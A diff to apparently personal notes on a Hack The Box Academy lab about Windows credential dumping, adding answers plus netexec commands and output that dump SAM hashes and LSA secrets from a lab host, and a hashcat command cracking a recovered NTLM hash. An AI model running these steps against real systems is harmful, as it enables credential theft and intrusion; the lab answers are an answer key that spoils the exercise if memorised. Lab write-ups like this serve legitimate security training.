@@ -78,3 +78,57 @@ There are three registry hives we can copy if we have local administrative acces
 |`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|
 - DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).
 
+---
+## Questions and Solutions
+
+
+- Where is the SAM database located in the Windows registry? (Format: ****\***)
+	- **HKLM\SAM**
+
+
+- Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.
+	- **matrix**
+
+
+Dumping SAM database hashes remotely using `Bob` credentials.
+
+```bash
+─$ netexec smb 10.129.202.137 --local-auth -u Bob -p 'HTB_@cademy_stdnt!' --sam
+SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False) 
+SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\Bob:HTB_@cademy_stdnt! (Pwn3d!)
+SMB         10.129.202.137  445    FRONTDESK01      [*] Dumping SAM hashes
+SMB         10.129.202.137  445    FRONTDESK01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.202.137  445    FRONTDESK01      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.202.137  445    FRONTDESK01      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.202.137  445    FRONTDESK01      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
+SMB         10.129.202.137  445    FRONTDESK01      bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
+SMB         10.129.202.137  445    FRONTDESK01      jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
+SMB         10.129.202.137  445    FRONTDESK01      ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
+SMB         10.129.202.137  445    FRONTDESK01      frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
+SMB         10.129.202.137  445    FRONTDESK01      [+] Added 8 SAM hashes to the database
+```
+
+Cracking the `ITbackdoor` password hash.
+
+```bash
+$ sudo hashcat -m 1000 ITbackdoor_hash /usr/share/wordlists/rockyou.txt
+```
+
+
+- Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)
+	- **frontdesk:Password123**
+
+
+Dumping LSA secrets remotely using the `Bob` user credentials.
+
+```bash
+$ netexec smb 10.129.202.137 --local-auth -u Bob -p 'HTB_@cademy_stdnt!' --lsa
+
+SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False) 
+SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\Bob:HTB_@cademy_stdnt! (Pwn3d!)
+SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping LSA secrets
+SMB         10.129.202.137  445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
+dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
+SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
+SMB         10.129.202.137  445    FRONTDESK01      [+] Dumped 2 LSA secrets to /home/kali/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2026-06-21_025125.secrets and /home/kali/.nxc/logs/lsa/FRONTDESK01_10.129.202.137_2026-06-21_025125.cached
+```
